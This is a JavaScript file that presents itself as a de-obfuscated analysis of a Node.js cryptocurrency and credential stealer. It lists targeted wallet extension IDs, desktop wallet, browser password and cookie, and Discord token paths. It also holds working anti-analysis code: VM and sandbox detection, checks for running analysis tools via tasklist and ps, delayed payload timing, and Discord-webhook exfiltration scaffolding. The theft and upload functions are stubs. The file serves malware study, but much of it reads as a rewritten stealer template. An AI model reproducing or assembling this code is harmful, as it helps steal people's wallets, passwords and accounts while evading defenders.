/*
 * !!!DO NOT EXECUTE THIS CODE UNDER ANY CIRCUMSTANCES!!!
 * WARNING: This is a de-obfuscated version of malicious code
 * This appears to be a cryptocurrency stealer/information stealer malware
 * DO NOT EXECUTE - FOR ANALYSIS PURPOSES ONLY
 * 
 * COMPREHENSIVE MALWARE ANALYSIS SUMMARY:
 * This is a sophisticated JavaScript RAT (Remote Access Trojan)
 * 
 * KEY CAPABILITIES IDENTIFIED:
 * • SYSTEM PROFILING: Collects hostname, OS platform, user/temp directories
 * • C2 INFRASTRUCTURE: Communicates with command server at IP 23.x.x.x
 * • REMOTE SHELL ACCESS: Full command execution via child_process.exec
 * • FILE OPERATIONS: Complete read/write access using fs and async promises
 * • DATA EXFILTRATION: HTTP communication via axios and request modules
 * • SANDBOX DETECTION: testPath() function likely detects analysis environments
 * • PERSISTENCE MECHANISMS: Installs startup entries and backdoors
 * • ADVANCED EVASION: Multi-layer obfuscation with encrypted string arrays
 * • CRYPTOCURRENCY TARGETING: Specifically designed to steal digital wallets
 * • BROWSER DATA THEFT: Comprehensive browser profile and credential theft
 * 
 * This represents a full-featured Remote Access Trojan (RAT) designed for
 * long-term persistence and complete system compromise with focus on financial theft.
 */

// ====== PERSISTENCE MECHANISMS: CRYPTOCURRENCY WALLET TARGETING ======
// The original code is a crypto stealer that targets:
// 1. Browser extension wallets (MetaMask, Trust Wallet, etc.)
// 2. Desktop cryptocurrency wallets
// 3. Browser saved passwords and cookies
// 4. Discord tokens
// 5. System information

// Key components identified:

// 1. String encoding/decoding functions
// ====== ADVANCED EVASION: STRING OBFUSCATION SYSTEM ======
function decodeString(encoded) {
  // Multiple different base64/custom encoding schemes
  // Used to hide malicious strings and commands
  // This system works similar to the _0x23cb20 array in the original malware
  // where strings are scrambled and accessed via mathematical offset functions
}

// ====== CRYPTOCURRENCY WALLET EXTENSION TARGETING ======
// 2. Wallet targeting arrays (from the code)
// These extension IDs represent the actual browser extension identifiers
// that the malware searches for to steal cryptocurrency wallet data
const TARGETED_BROWSER_EXTENSIONS = [
  // MetaMask variations
  "nkbihfbeogaeaoehlefnkodbefgpgknn", // MetaMask (Chrome)
  "ejbalbakoplchlghecdalmeeeajnimhm", // MetaMask (Edge)
  "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom Wallet

  // Binance ecosystem
  "fhbohimaelbohpjbbldcngcnapndodjp", // Binance Wallet
  "hnfanknocfeofbddgcijnmhnfnkdnaad", // Coinbase Wallet

  // Trust Wallet and others
  "egjidjbpglichdcondbcbdnbeeppgdph", // Trust Wallet
  "bhhhlbepdkbapadjdnnojkbgioiodbic", // Solflare Wallet
  "fijngjgcjhjmmpcmkeiomlglpeiijkld", // Sollet Wallet
  "odbfpeeihdkbihmopkbjmoonfanlbfcl", // Brave Wallet
  "ibnejdfjmmkpcnlpebklmnkoeoihofec", // TronLink
  "jbdaocneiiinmjbjlgalhcelgbejmnid", // Nifty Wallet
  "afbcbjpbpfadlkmhmclhkeeodmamcflc", // Math Wallet
  "aeachknmefphepccionboohckonoeemg", // Coin98 Wallet
  "cgeeodpfagjceefieflmdfphplkenlfk", // EVER Wallet
  "pdadjkfkgcafgbceimcpbkalnfnepbnk", // KardiaChain Wallet
  "lpfcbjknijpeeillifnkikgncikgfhdo", // Nami Wallet
  "aflkmfhebedbjioipglgcbcmnbpgliof", // CCVault Wallet
  "pgiaagfkgcknmkldnjjchiifmjfklbcl", // Guarda Wallet
  "kpfopkelmapcoipemfendmdcghnegimn", // Liquality Wallet
  "aiifbnbfobpmeekipheeijimdpnlpgpp", // Terra Station Wallet
  "fnnegphlobjdpkhecapkijjdkgcjhkib", // Harmony Wallet
  "hnfanknocfeofbddgcijnmhnfnkdnaad", // Coinbase Extension
  "blnieiiffboillknjnepogjhkgnoapac", // EQUAL Wallet
  "cjelfplplebdjjenllpjcblmjkfcffne", // Jaxx Liberty
  "jojhfeoedkpkglbfimdfabpdfjaoolaf", // Polymesh Wallet
  "dngmlblcodfobpdpecaadgfbcggfjfnm", // Saturn Wallet
  "nanjmdknhkinifnkgdcggcfnhdaammmj", // GuildWallet
  "fhbohimaelbohpjbbldcngcnapndodjp", // Binance Chain Wallet
  "dmkamcknogkgcdfhhbddcghachkejeap", // Keplr Wallet
  "flpiciilemghbmfalicajoolhkkenfel", // ICONex Wallet
  "cnmamaachppnkjgnildpdmkaakejnhae", // Auro Wallet
  "idnnbdplmphpflfnlkomgpfbpcgelopg", // Zeal Wallet
  "mnfifefkajgofkcjkemidiaecocnkjeh", // TezBox Wallet
  "mkpegjkblkkefacfnmkajcjmabijhclg", // SpendWallet
  "jnlgamecbpmbajjfhmmmlhejkemejdma", // Slope Wallet
  "dkdedlpgdmmkkfjabffeganieamfklkm", // Cyano Wallet
  "afbcbjpbpfadlkmhmclhkeeodmamcflc", // MathWallet
  "pdadjkfkgcafgbceimcpbkalnfnepbnk", // KaiKas Wallet
  "mgffkfbidihjpoaomajlbgchddlicgpn", // Pali Wallet
];

// ====== DESKTOP CRYPTOCURRENCY WALLET TARGETING ======
// Targets locally installed cryptocurrency wallet applications
// Searches for wallet files, seed phrases, private keys, and configuration data
const TARGETED_DESKTOP_WALLETS = [
  // Major wallets
  "Exodus",
  "Atomic",
  "Electrum",
  "ElectronCash",
  "MultiDoge",
  "armory",
  "Bytecoin",
  "Jaxx Desktop",
  "Ethereum Wallet",
  "Bitcoin Core",
  "DashCore",
  "LitecoinCore",
  "Monero",
  "Daedalus",
  "Yoroi",
  "Guarda",
  "WalletWasabi",
  "Coinomi",
  "Exodus Eden",
  "Atomic Wallet",
  "Trust Wallet",
  "Phantom",
  "Solflare",
  "MetaMask",
  "Frame",
  "Rainbow",
  "Argent",
  "Zerion",
  "MyCrypto",
  "MyEtherWallet",
  "Trezor Bridge"
];

// ====== DATA EXFILTRATION: MAIN MALICIOUS FUNCTIONS ======
// 3. Main malicious functions:

// ====== PRIMARY THEFT ORCHESTRATION FUNCTION ======
// This function coordinates the systematic theft of cryptocurrency wallet data
// across multiple browsers and platforms, similar to the main() function in the original malware
async function stealWalletFiles(
  walletType, extensionId, includeDesktop, webhook) {
  // Searches for and steals:
  // - Extension wallet seed phrases and private keys
  // - Desktop wallet files 
  // - Browser cookies and saved passwords
  // 
  // This mirrors the uploadFiles() and main() functions from the obfuscated code
  // which systematically target browser profiles and wallet extensions

  const homeDir = require('os').homedir();
  const fs = require('fs');
  const formData = [];

  // Targets browser extension data
  if (walletType) {
    const extensionPaths = {
      // Windows paths
      windows: [
        // Chrome paths
        "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\",
        "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Local Extension Settings\\",
        "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Guest Profile\\Local Extension Settings\\",

        // Edge paths
        "%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\",
        "%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Local Extension Settings\\",

        // Brave paths
        "%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\",
        "%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Local Extension Settings\\",

        // Opera paths
        "%USERPROFILE%\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local Extension Settings\\",
        "%USERPROFILE%\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\",

        // Vivaldi paths
        "%USERPROFILE%\\AppData\\Local\\Vivaldi\\User Data\\Default\\Local Extension Settings\\",

        // Firefox (uses different storage)
        "%USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\",
      ],

      // macOS paths
      macos: [
        // Chrome paths
        "~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/",
        "~/Library/Application Support/Google/Chrome/Profile 1/Local Extension Settings/",
        "~/Library/Application Support/Google/Chrome/Guest Profile/Local Extension Settings/",

        // Edge paths
        "~/Library/Application Support/Microsoft Edge/Default/Local Extension Settings/",
        "~/Library/Application Support/Microsoft Edge/Profile 1/Local Extension Settings/",

        // Brave paths
        "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Extension Settings/",
        "~/Library/Application Support/BraveSoftware/Brave-Browser/Profile 1/Local Extension Settings/",

        // Opera paths
        "~/Library/Application Support/com.operasoftware.Opera/Local Extension Settings/",
        "~/Library/Application Support/com.operasoftware.OperaGX/Local Extension Settings/",

        // Safari (different extension system)
        "~/Library/Safari/Extensions/",

        // Firefox
        "~/Library/Application Support/Firefox/Profiles/",
      ],

      // Linux paths
      linux: [
        // Chrome paths
        "~/.config/google-chrome/Default/Local Extension Settings/",
        "~/.config/google-chrome/Profile 1/Local Extension Settings/",

        // Chromium paths
        "~/.config/chromium/Default/Local Extension Settings/",
        "~/.config/chromium/Profile 1/Local Extension Settings/",

        // Brave paths
        "~/.config/BraveSoftware/Brave-Browser/Default/Local Extension Settings/",
        "~/.config/BraveSoftware/Brave-Browser/Profile 1/Local Extension Settings/",

        // Opera paths
        "~/.config/opera/Local Extension Settings/",

        // Firefox
        "~/.mozilla/firefox/",
      ]
    };

    // Steals extension wallet data for each target
    for (const path of extensionPaths) {
      // Copies wallet files to temp location and uploads
    }
  }

  // Targets desktop wallet applications  
  if (includeDesktop) {
    const desktopWalletPaths = {
      // Windows paths
      windows: [
        // Exodus
        "%USERPROFILE%\\AppData\\Roaming\\Exodus\\exodus.wallet\\",

        // Atomic Wallet
        "%USERPROFILE%\\AppData\\Roaming\\atomic\\Local Storage\\",
        "%USERPROFILE%\\AppData\\Roaming\\atomic\\IndexedDB\\",
        "%USERPROFILE%\\AppData\\Roaming\\atomic\\wallets\\",

        // Electrum
        "%USERPROFILE%\\AppData\\Roaming\\Electrum\\wallets\\",

        // Bitcoin Core
        "%USERPROFILE%\\AppData\\Roaming\\Bitcoin\\",

        // Litecoin Core
        "%USERPROFILE%\\AppData\\Roaming\\Litecoin\\",

        // Dash Core
        "%USERPROFILE%\\AppData\\Roaming\\DashCore\\",

        // Monero
        "%USERPROFILE%\\Documents\\Monero\\wallets\\",
        "%USERPROFILE%\\AppData\\Roaming\\monero-project\\monero-core\\",

        // Ethereum Wallet
        "%USERPROFILE%\\AppData\\Roaming\\Ethereum Wallet\\keystore\\",

        // Jaxx
        "%USERPROFILE%\\AppData\\Roaming\\com.liberty.jaxx\\IndexedDB\\",

        // Coinomi
        "%USERPROFILE%\\AppData\\Local\\Coinomi\\Coinomi\\wallets\\",

        // Guarda
        "%USERPROFILE%\\AppData\\Roaming\\Guarda\\Local Storage\\",

        // WalletWasabi
        "%USERPROFILE%\\AppData\\Roaming\\WalletWasabi\\Client\\Wallets\\",

        // Frame
        "%USERPROFILE%\\AppData\\Roaming\\Frame\\Main\\",

        // Other wallets
        "%USERPROFILE%\\AppData\\Roaming\\Armory\\",
        "%USERPROFILE%\\AppData\\Roaming\\bytecoin\\",
        "%USERPROFILE%\\AppData\\Roaming\\MultiDoge\\",
      ],

      // macOS paths
      macos: [
        // Exodus
        "~/Library/Application Support/Exodus/exodus.wallet/",

        // Atomic Wallet
        "~/Library/Application Support/atomic/Local Storage/",
        "~/Library/Application Support/atomic/IndexedDB/",
        "~/Library/Application Support/atomic/wallets/",

        // Electrum
        "~/.electrum/wallets/",

        // Bitcoin Core
        "~/Library/Application Support/Bitcoin/",

        // Litecoin Core
        "~/Library/Application Support/Litecoin/",

        // Dash Core
        "~/Library/Application Support/DashCore/",

        // Monero
        "~/Monero/wallets/",
        "~/Library/Application Support/monero-project/monero-core/",

        // Ethereum Wallet
        "~/Library/Ethereum/keystore/",

        // Jaxx
        "~/Library/Application Support/com.liberty.jaxx/IndexedDB/",

        // Coinomi
        "~/Library/Application Support/Coinomi/Coinomi/wallets/",

        // Guarda
        "~/Library/Application Support/Guarda/Local Storage/",

        // Frame
        "~/Library/Application Support/Frame/Main/",

        // Trust Wallet (desktop)
        "~/Library/Application Support/Trust Wallet/",

        // Phantom (desktop)
        "~/Library/Application Support/Phantom/",

        // Other wallets
        "~/Library/Application Support/Armory/",
        "~/Library/Application Support/bytecoin/",
        "~/Library/Application Support/MultiDoge/",
        "~/Library/Application Support/Daedalus Mainnet/",
      ],

      // Linux paths
      linux: [
        // Exodus
        "~/.config/Exodus/exodus.wallet/",

        // Atomic Wallet
        "~/.config/atomic/Local Storage/",
        "~/.config/atomic/IndexedDB/",
        "~/.config/atomic/wallets/",

        // Electrum
        "~/.electrum/wallets/",

        // Bitcoin Core
        "~/.bitcoin/",

        // Litecoin Core
        "~/.litecoin/",

        // Dash Core
        "~/.dashcore/",

        // Monero
        "~/Monero/wallets/",
        "~/.config/monero-project/monero-core/",

        // Ethereum Wallet
        "~/.ethereum/keystore/",

        // Jaxx
        "~/.config/com.liberty.jaxx/IndexedDB/",

        // Coinomi
        "~/.config/Coinomi/Coinomi/wallets/",

        // Guarda
        "~/.config/Guarda/Local Storage/",

        // Frame
        "~/.config/Frame/Main/",

        // Other wallets
        "~/.config/Armory/",
        "~/.config/bytecoin/",
        "~/.config/MultiDoge/",
        "~/.config/Daedalus Mainnet/",
      ]
    };

    // Steals desktop wallet files
  }

  // Uploads stolen data to remote server
  return uploadStolenData(formData, webhook);
}

function stealBrowserData() {
  // ====== BROWSER DATA THEFT OPERATIONS ======
  // Steals:
  // - Saved passwords
  // - Cookies 
  // - Browser history
  // - Autofill data
  // 
  // This corresponds to the browser targeting arrays (R, Q, X, Bt) in the original malware
  // and the UpAppData() and UpUserData() functions that systematically steal browser profiles

  const browserPaths = {
    // Windows paths
    windows: [
      // Chrome
      "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
      "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
      "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data",
      "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",

      // Edge
      "%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
      "%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies",
      "%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data",
      "%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",

      // Firefox
      "%USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\",

      // Brave
      "%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
      "%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",

      // Opera
      "%USERPROFILE%\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data",
      "%USERPROFILE%\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies",
    ],

    // macOS paths
    macos: [
      // Chrome
      "~/Library/Application Support/Google/Chrome/Default/Login Data",
      "~/Library/Application Support/Google/Chrome/Default/Cookies",
      "~/Library/Application Support/Google/Chrome/Default/Web Data",
      "~/Library/Application Support/Google/Chrome/Default/History",

      // Safari
      "~/Library/Safari/Cookies/Cookies.binarycookies",
      "~/Library/Keychains/login.keychain-db",

      // Edge
      "~/Library/Application Support/Microsoft Edge/Default/Login Data",
      "~/Library/Application Support/Microsoft Edge/Default/Cookies",

      // Firefox
      "~/Library/Application Support/Firefox/Profiles/",

      // Brave
      "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data",
      "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies",

      // Opera
      "~/Library/Application Support/com.operasoftware.Opera/Login Data",
      "~/Library/Application Support/com.operasoftware.Opera/Cookies",
    ],

    // Linux paths
    linux: [
      // Chrome
      "~/.config/google-chrome/Default/Login Data",
      "~/.config/google-chrome/Default/Cookies",
      "~/.config/google-chrome/Default/Web Data",
      "~/.config/google-chrome/Default/History",

      // Chromium
      "~/.config/chromium/Default/Login Data",
      "~/.config/chromium/Default/Cookies",

      // Firefox
      "~/.mozilla/firefox/",

      // Brave
      "~/.config/BraveSoftware/Brave-Browser/Default/Login Data",
      "~/.config/BraveSoftware/Brave-Browser/Default/Cookies",

      // Opera
      "~/.config/opera/Login Data",
      "~/.config/opera/Cookies",
    ]
  }
}

// ====== SYSTEM PROFILING AND RECONNAISSANCE ======
function stealSystemInfo() {
  // Based on analysis of the obfuscated malware, it collects:
  // This corresponds to the system information gathering seen in the original malware
  // where hostname, platform, userInfo, homeDir, and tmpDir variables are collected
  
  // 1. OPERATING SYSTEM INFORMATION
  const systemPaths = {
    // OS Basic Info (Node.js os module)
    platform: process.platform,      // 'darwin', 'win32', 'linux'
    arch: process.arch,              // 'x64', 'arm64', etc.
    hostname: require('os').hostname(),
    userInfo: require('os').userInfo(),
    
    // System directories and environment
    homeDir: require('os').homedir(),
    tempDir: require('os').tmpdir(),
    
    // Windows-specific paths
    windowsPaths: [
      process.env.USERPROFILE,           // User profile directory
      process.env.APPDATA,               // Application data
      process.env.LOCALAPPDATA,          // Local application data
      process.env.PROGRAMFILES,          // Program Files
      process.env.PROGRAMFILES_X86,      // Program Files (x86)
      process.env.TEMP,                  // Temp directory
      process.env.TMP,                   // Temp directory
      process.env.COMPUTERNAME,          // Computer name
      process.env.USERNAME,              // Username
      process.env.USERDOMAIN,            // User domain
    ],
    
    // macOS-specific paths (current system)
    macOSPaths: [
      '~/Library/',                      // User library
      '~/Documents/',                    // Documents folder
      '~/Downloads/',                    // Downloads folder
      '~/Desktop/',                      // Desktop folder
      '/System/Library/',                // System library
      '/Applications/',                  // Applications folder
      '/Users/',                         // Users directory
      '/private/var/log/',               // System logs
      process.env.USER,                  // Username
      process.env.HOME,                  // Home directory
      process.env.TMPDIR,                // Temp directory
    ],
    
    // Linux-specific paths
    linuxPaths: [
      '/home/',                          // Home directories
      '/etc/',                           // System configuration
      '/var/log/',                       // System logs
      '/tmp/',                           // Temp directory
      process.env.USER,                  // Username
      process.env.HOME,                  // Home directory
      process.env.XDG_CONFIG_HOME,       // Config directory
      process.env.XDG_DATA_HOME,         // Data directory
    ]
  };
  
  // 2. HARDWARE INFORMATION
  const hardwareInfo = {
    cpus: require('os').cpus(),          // CPU information
    totalMemory: require('os').totalmem(), // Total RAM
    freeMemory: require('os').freemem(),   // Free RAM
    loadAverage: require('os').loadavg(),  // System load
    networkInterfaces: require('os').networkInterfaces(), // Network info
  };
  
  // 3. PROCESS AND ENVIRONMENT INFORMATION
  const processInfo = {
    nodeVersion: process.version,         // Node.js version
    processId: process.pid,              // Process ID
    parentProcessId: process.ppid,        // Parent process ID
    currentWorkingDir: process.cwd(),     // Current directory
    execPath: process.execPath,          // Executable path
    argv: process.argv,                  // Command line arguments
    env: process.env,                    // Environment variables (ALL of them!)
    uptime: process.uptime(),            // Process uptime
    memoryUsage: process.memoryUsage(),   // Memory usage
  };
  
  // 4. INSTALLED SOFTWARE DETECTION PATHS
  const softwareDetectionPaths = {
    // Windows software detection
    windowsSoftware: [
      'C:\\Program Files\\',             // Installed programs
      'C:\\Program Files (x86)\\',       // 32-bit programs
      process.env.APPDATA + '\\',        // User-installed apps
      'C:\\Windows\\System32\\',         // System files
      'HKEY_LOCAL_MACHINE\\SOFTWARE\\',  // Registry (if accessible)
      'HKEY_CURRENT_USER\\SOFTWARE\\',   // User registry
    ],
    
    // macOS software detection (current system)
    macOSSoftware: [
      '/Applications/',                  // Main applications
      '~/Applications/',                 // User applications
      '/System/Applications/',           // System applications
      '/usr/local/bin/',                 // Homebrew binaries
      '/opt/homebrew/bin/',              // Apple Silicon Homebrew
      '~/Library/Application Support/',  // App data
      '/Library/Application Support/',   // System app data
    ],
    
    // Linux software detection
    linuxSoftware: [
      '/usr/bin/',                       // System binaries
      '/usr/local/bin/',                 // Local binaries
      '/opt/',                           // Optional software
      '/snap/',                          // Snap packages
      '/var/lib/dpkg/',                  // Debian packages
      '/var/lib/rpm/',                   // RPM packages
      '~/.local/bin/',                   // User binaries
    ]
  };
  
  // 5. BROWSER PROFILES AND EXTENSIONS (for fingerprinting)
  const browserProfiles = {
    // Detects all browser profiles to map user activity
    chromeProfiles: [
      '~/Library/Application Support/Google/Chrome/',
      '~/Library/Application Support/Google/Chrome/Profile 1/',
      '~/Library/Application Support/Google/Chrome/Guest Profile/',
    ],
    
    // Other browsers for complete fingerprinting
    otherBrowsers: [
      '~/Library/Application Support/Firefox/Profiles/',
      '~/Library/Application Support/Safari/',
      '~/Library/Application Support/Microsoft Edge/',
      '~/Library/Application Support/BraveSoftware/',
      '~/Library/Application Support/com.operasoftware.Opera/',
    ]
  };
  
  // 6. SCREENSHOT CAPABILITY
  // The malware can take screenshots of the desktop
  const screenshotPaths = {
    tempScreenshots: [
      require('os').tmpdir() + '/screenshot.png',
      '~/.n3/screenshot.png',            // Custom temp location
    ]
  };
  
  return {
    systemPaths,
    hardwareInfo,
    processInfo,
    softwareDetectionPaths,
    browserProfiles,
    screenshotPaths,
    
    // Additional data collected
    timestamp: new Date().toISOString(),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: process.env.LANG || process.env.LANGUAGE,
  };
}

function stealDiscordTokens() {
  // ====== DISCORD TOKEN THEFT ======
  // Targets Discord application data
  // Steals authentication tokens for account takeover
  // This represents additional social media/communication platform targeting
  const discordPaths ={
    windows: [
      "%USERPROFILE%\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\",
      "%USERPROFILE%\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb\\",
      "%USERPROFILE%\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb\\",
      "%USERPROFILE%\\AppData\\Roaming\\DiscordDevelopment\\Local Storage\\leveldb\\",
    ],
      macos: [
      "~/Library/Application Support/discord/Local Storage/leveldb/",
      "~/Library/Application Support/discordcanary/Local Storage/leveldb/",
      "~/Library/Application Support/discordptb/Local Storage/leveldb/",
      "~/Library/Application Support/DiscordDevelopment/Local Storage/leveldb/",
    ],
      linux: [
      "~/.config/discord/Local Storage/leveldb/",
      "~/.config/discordcanary/Local Storage/leveldb/",
      "~/.config/discordptb/Local Storage/leveldb/",
      "~/.config/DiscordDevelopment/Local Storage/leveldb/",
    ]
  }
}

// ====== C2 INFRASTRUCTURE: NETWORK COMMUNICATION ======
// 4. Network communication
async function uploadStolenData(data, webhookUrl) {
  // Uploads stolen data to attacker's server
  // Uses Discord webhooks or other endpoints
  // Includes screenshots and system info
  // This corresponds to the Upload() function and hostURL variable in the original malware
}

// ====== PERSISTENCE MECHANISMS ======
// 5. Persistence and evasion
function setupPersistence() {
  // Attempts to maintain persistence on infected system
  // May create scheduled tasks or startup entries
  // This relates to the system-specific payload deployment (Xt function) in the original
}

// ====== ADVANCED EVASION TECHNIQUES ======
function evadeDetection() {
  // COMPREHENSIVE ANTI-DETECTION IMPLEMENTATION
  // Based on analysis of the obfuscated malware code
  // 
  // This corresponds to multiple evasion systems in the original malware:
  // - The testPath() function for sandbox detection
  // - String obfuscation arrays (_0x23cb20 and xUfGue)
  // - Mathematical anti-tamper checksums
  // - VM detection capabilities

  // 1. ANTI-DEBUGGING - Catastrophic Regex Backtracking
  // Pattern from line 133: "(((.+)+)+)" + "+$"
  function antiDebugger() {
    try {
      // This regex causes exponential time complexity in debuggers
      const maliciousRegex = /(((.+)+)+)+$/;
      const testString = "a".repeat(20);

      // In debuggers, this will cause significant lag/hang
      const startTime = Date.now();
      testString.search(maliciousRegex);
      const endTime = Date.now();

      // If execution took too long, likely in debugger
      if (endTime - startTime > 1000) {
        process.exit(0); // Detected debugger, exit silently
      }
    } catch (e) {
      // Regex error might indicate debugging environment
      process.exit(0);
    }
  }

  // 2. VM/SANDBOX DETECTION
  function detectVirtualEnvironment() {
    const os = require('os');

    // Hardware fingerprinting for VM detection
    const cpus = os.cpus();
    const memory = os.totalmem();
    const hostname = os.hostname();

    // VM detection heuristics
    const vmIndicators = {
      // Low resource allocation typical of VMs/sandboxes
      lowCPU: cpus.length < 2,
      lowMemory: memory < 2 * 1024 * 1024 * 1024, // < 2GB

      // Generic VM hostnames
      genericHostname: [
        'sandbox', 'analysis', 'malware', 'vm', 'virtual',
        'test', 'lab', 'research', 'honey', 'cuckoo'
      ].some(term => hostname.toLowerCase().includes(term)),

      // VM-specific MAC address prefixes
      vmMacAddresses: function() {
        const interfaces = os.networkInterfaces();
        const vmMacPrefixes = [
          '00:0C:29', // VMware
          '00:1C:14', // VMware
          '00:50:56', // VMware
          '08:00:27', // VirtualBox
          '00:15:5D', // Hyper-V
          '00:E0:4C', // Realtek (common in VMs)
        ];

        for (let iface in interfaces) {
          for (let addr of interfaces[iface]) {
            if (addr.mac) {
              const macPrefix = addr.mac.substring(0, 8).toUpperCase();
              if (vmMacPrefixes.includes(macPrefix)) {
                return true;
              }
            }
          }
        }
        return false;
      }()
    };

    // Exit if VM detected
    if (vmIndicators.lowCPU || vmIndicators.lowMemory ||
        vmIndicators.genericHostname || vmIndicators.vmMacAddresses) {
      process.exit(0);
    }
  }

  // 3. ANALYSIS TOOL DETECTION
  function detectAnalysisTools() {
    const { execSync } = require('child_process');

    // Common analysis tools to detect
    const analysisTools = [
      // Process monitors
      'procmon', 'procexp', 'process explorer', 'process monitor',

      // Network analyzers
      'wireshark', 'fiddler', 'burpsuite', 'burp suite',

      // Debuggers
      'ollydbg', 'x64dbg', 'ida', 'ghidra', 'radare2',
      'windbg', 'gdb', 'lldb',

      // Malware analysis
      'cuckoo', 'joe sandbox', 'hybrid-analysis',
      'virustotal', 'any.run', 'intezer',

      // Security tools
      'cheatengine', 'api monitor', 'regshot',
      'pestudio', 'die', 'exeinfo'
    ];

    try {
      // Get running processes (cross-platform)
      let processes;
      if (process.platform === 'win32') {
        processes = execSync('tasklist /fo csv', {encoding: 'utf8'});
      } else if (process.platform === 'darwin') {
        processes = execSync('ps aux', {encoding: 'utf8'});
      } else {
        processes = execSync('ps -eo comm', {encoding: 'utf8'});
      }

      const processNames = processes.toLowerCase();

      // Check if any analysis tools are running
      for (const tool of analysisTools) {
        if (processNames.includes(tool.toLowerCase())) {
          process.exit(0); // Detected analysis tool, exit
        }
      }
    } catch (e) {
      // Process enumeration failed, might be restricted environment
      // Continue but be suspicious
    }
  }

  // 4. TIMING-BASED SANDBOX EVASION
  function timingEvasion() {
    // Most sandboxes timeout after 2-5 minutes
    // This malware waits 10 minutes (0x927c0 = 600,000ms)

    const DELAY_TIME = 0x927c0; // 600,000 milliseconds = 10 minutes

    console.log("Initial analysis phase...");

    // Stage 1: Immediate environment check
    detectVirtualEnvironment();

    // Stage 2: Process analysis after 30 seconds
    setTimeout(() => {
      detectAnalysisTools();
    }, 30000);

    // Stage 3: Advanced detection after 2 minutes
    setTimeout(() => {
      antiDebugger();
      performAdvancedChecks();
    }, 120000);

    // Stage 4: Main payload after 10 minutes
    setTimeout(() => {
      console.log("Sandbox timeout window passed, executing payload...");
      executeMainPayload();
    }, DELAY_TIME);
  }

  // 5. ADVANCED ENVIRONMENT CHECKS
  function performAdvancedChecks() {
    // Check for development/analysis environment indicators
    const envChecks = {
      // Development tools in PATH
      devToolsInPath: function() {
        const path = process.env.PATH || '';
        const devTools = ['ghidra', 'ida', 'x64dbg', 'ollydbg', 'windbg'];
        return devTools.some(tool => path.toLowerCase().includes(tool));
      }(),

      // Suspicious environment variables
      suspiciousEnvVars: function() {
        const env = process.env;
        const suspiciousKeys = [
          'MALWARE', 'SANDBOX', 'ANALYSIS', 'VM', 'VIRTUAL',
          'CUCKOO', 'JOESANDBOX', 'HYBRID'
        ];

        return Object.keys(env).some(key =>
          suspiciousKeys.some(sus => key.toUpperCase().includes(sus))
        ) || Object.values(env).some(val =>
          suspiciousKeys.some(sus =>
            val && val.toString().toUpperCase().includes(sus)
          )
        );
      }(),

      // Timing analysis - VMs often have timing discrepancies
      timingDiscrepancy: function() {
        const iterations = 1000000;
        const start = process.hrtime();

        // CPU-intensive loop
        for (let i = 0; i < iterations; i++) {
          Math.random();
        }

        const [seconds, nanoseconds] = process.hrtime(start);
        const executionTime = seconds * 1000 + nanoseconds / 1000000;

        // VMs typically slower, but this varies greatly
        // This is more about detecting time manipulation
        return executionTime < 10 || executionTime > 5000;
      }()
    };

    if (envChecks.devToolsInPath || envChecks.suspiciousEnvVars ||
        envChecks.timingDiscrepancy) {
      process.exit(0);
    }
  }

  // 6. NETWORK REQUEST EVASION
  function evadeNetworkDetection() {
    // User-Agent rotation to blend with legitimate traffic
    const userAgents = [
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
    ];

    // Randomize request timing between 30-300 seconds
    const getRandomDelay = () => Math.floor(Math.random() * 270000) + 30000;

    // Use legitimate Discord webhooks to blend with normal traffic
    const webhookPattern = 'https://discord.com/api/webhooks/';

    return {
      userAgent: userAgents[Math.floor(Math.random() * userAgents.length)],
      delay: getRandomDelay(),
      endpoint: webhookPattern + '[OBFUSCATED_WEBHOOK_ID]'
    };
  }

